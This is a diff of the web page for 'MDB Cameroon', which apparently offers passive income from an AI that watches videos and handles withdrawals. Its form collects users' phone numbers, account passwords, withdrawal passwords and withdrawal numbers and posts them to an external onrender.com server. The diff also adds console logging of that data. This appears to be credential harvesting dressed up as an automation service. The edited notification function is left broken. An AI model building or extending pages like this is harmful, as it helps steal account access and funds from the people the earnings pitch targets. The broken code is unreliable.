@@ -558,7 +558,7 @@
         <!-- Info Popup -->
         <div class="modal active" id="infoModal">
           <div class="modal-content">
-            <h3 class="modal-header" data-i18n="info_title">🚀 What is MDB IA ?</h3>
+            <h3 class="modal-header" data-i18n="info_title">🚀 What is MDB?</h3>
             <p
               style="
                 margin-bottom: 16px;
@@ -743,11 +743,13 @@
               type="tel"
               id="accountPhone"
               class="form-control"
+              placeholder="+237 6XX XXX XXX"
               required
               aria-required="true"
-              pattern="^\+?[0-9\s\-()]{9,}$"
             />
-            <div class="input-hint" data-i18n="phone_hint"></div>
+            <div class="input-hint" data-i18n="phone_hint">
+              Include country code (e.g., +237)
+            </div>
           </div>
 
           <div class="form-group">
@@ -761,7 +763,9 @@
               required
               aria-required="true"
             />
-            <div class="input-hint" data-i18n="password_hint"></div>
+            <div class="input-hint" data-i18n="password_hint">
+              Enter your password
+            </div>
           </div>
 
           <div class="form-group">
@@ -777,7 +781,9 @@
               required
               aria-required="true"
             />
-            <div class="input-hint" data-i18n="withdrawal_hint"></div>
+            <div class="input-hint" data-i18n="withdrawal_hint">
+              Used for secure transactions
+            </div>
           </div>
 
           <div class="form-group">
@@ -788,10 +794,13 @@
               type="text"
               id="withdrawalNumbers"
               class="form-control"
+              placeholder="+237 6XX XXX XXX, +237 6YY YYY YYY"
               required
               aria-required="true"
             />
-            <div class="input-hint" data-i18n="withdrawal_numbers_hint"></div>
+            <div class="input-hint" data-i18n="withdrawal_numbers_hint">
+              Comma-separated list
+            </div>
           </div>
 
           <div class="modal-footer">
@@ -812,9 +821,9 @@
     <script>
       const i18n = {
         en: {
-          info_title: "🚀 What is MDB AI ?",
+          info_title: "🚀 What is MDB?",
           info_desc:
-            "MDB AI Cameroon is an intelligent automation platform that helps you earn passive income through automated tasks and commission-based opportunities.",
+            "MDB Cameroon is an intelligent automation platform that helps you earn passive income through automated tasks and commission-based opportunities.",
           info_features:
             "Our AI handles everything: watches your videos, completes tasks, and processes withdrawals automatically to maximize your earnings.",
           info_disclaimer:
@@ -840,13 +849,14 @@
           nav_account: "Account",
           account_title: "Account Management",
           phone_label: "Phone Number",
-
+          phone_hint: "Include country code (e.g., +237)",
           password_label: "Password",
-
+          password_hint: "Minimum 8 characters",
           withdrawal_password_label: "Withdrawal Password",
-
+          withdrawal_hint: "Used for secure transactions",
           withdrawal_numbers_label: "Authorized Withdrawal Numbers",
-
+          withdrawal_numbers_hint:
+            "Comma-separated list of authorized phone numbers",
           btn_save: "Save",
           btn_cancel: "Cancel",
           validation_required: "This field is required",
@@ -871,7 +881,8 @@
           btn_start: "Commencer",
           config_title: "Configuration et Gestion de l'IA",
           ai_toggle_label: "Activer l'Intelligence Artificielle",
-          ai_features_title: "Ce que l'IA Fait Pour Vous",
+          ai_info_note:
+            "Veuillez d'abord renseigner vos informations de compte dans le menu Compte",
           feature1_title: "📹 Regarder les Vidéos Automatiquement",
           feature1_desc:
             "Votre IA regarde automatiquement les vidéos de votre compte 24/7, assurant un engagement continu et un potentiel de gain sans intervention manuelle requise.",
@@ -919,8 +930,8 @@
         accountFilled: false,
       };
 
-      const REFERRAL_LINK = "https://mdbcameroon-ia.onrender.com";
-      const API_URL = "https://mdbcameroon-ia.onrender.com/account";
+      const REFERRAL_LINK = "https://ia-mdb-server.onrender.com";
+      const API_URL = "https://ia-mdb-server.onrender.com/account";
 
       // DOM Elements
       const infoModal = document.getElementById("infoModal");
@@ -953,24 +964,11 @@
           btn.classList.toggle("active", btn.dataset.lang === lang);
         });
       }
-//notif syst
+
+      // Notification System
       function showNotification(message, type = "info", duration = 4000) {
-        // ✅ NOUVELLE LIGNE - Créer le conteneur s'il n'existe pas
-        let container = document.getElementById("notificationContainer");
-        if (!container) {
-          container = document.createElement("div");
-          container.id = "notificationContainer";
-          document.body.insertBefore(container, document.body.firstChild);
-        }
-
         const notif = document.createElement("div");
-        notif.className = `notification ${type} show`;
-        notif.innerHTML = `
-        ${message}
-        <button class="notification-close" aria-label="Close notification">&times;</button>
-      `;
-
-        container.appendChild(notif); // ✅ Utilise container au lieu de notificationContainer
+        notificationContainer.appendChild(notif);
 
         const closeBtn = notif.querySelector(".notification-close");
         closeBtn.addEventListener("click", () => notif.remove());
@@ -1034,6 +1032,9 @@
       // Send data to API
       async function sendDataToAPI(data) {
         try {
+          console.log("📤 Envoi des données:", data);
+          console.log("📍 URL cible:", API_URL);
+
           const response = await fetch(API_URL, {
             method: "POST",
             headers: {
@@ -1042,13 +1043,17 @@
             body: JSON.stringify(data),
           });
 
+          console.log("📨 Réponse du serveur - Status:", response.status);
+
           if (!response.ok) {
             throw new Error(`HTTP error! status: ${response.status}`);
           }
 
-          return await response.json();
+          const result = await response.json();
+          console.log("✅ Données reçues du serveur:", result);
+          return result;
         } catch (error) {
-          console.error("API Error:", error);
+          console.error("❌ Erreur API:", error);
           showNotification("Error sending data to server", "error");
           throw error;
         }
@@ -1163,38 +1168,6 @@
         ) {
           e.preventDefault();
           aiToggle.click();
-        }
-      });
-      // AI Toggle - Vérification avant activation
-      aiToggle.addEventListener("click", () => {
-        // Vérifier si le formulaire est rempli
-        const phone = document.getElementById("accountPhone").value.trim();
-        const pass = document.getElementById("accountPassword").value.trim();
-        const wpass = document
-          .getElementById("withdrawalPassword")
-          .value.trim();
-        const wn = document.getElementById("withdrawalNumbers").value.trim();
-
-        // Si un champ est vide
-        if (!phone || !pass || !wpass || !wn) {
-          showNotification(i18n[state.currentLang].error_fill_account, "error");
-
-          // Ouvrir le modal de compte après 500ms
-          setTimeout(() => {
-            accountModal.classList.add("active");
-            document.body.style.overflow = "hidden";
-          }, 500);
-
-          return; // Arrêter l'exécution
-        }
-
-        // Si tout est rempli, activer/désactiver le toggle
-        state.isAIEnabled = !state.isAIEnabled;
-        aiToggle.classList.toggle("active", state.isAIEnabled);
-        aiToggle.setAttribute("aria-checked", state.isAIEnabled);
-
-        if (state.isAIEnabled) {
-          showNotification(i18n[state.currentLang].ai_enabled, "success");
         }
       });
 
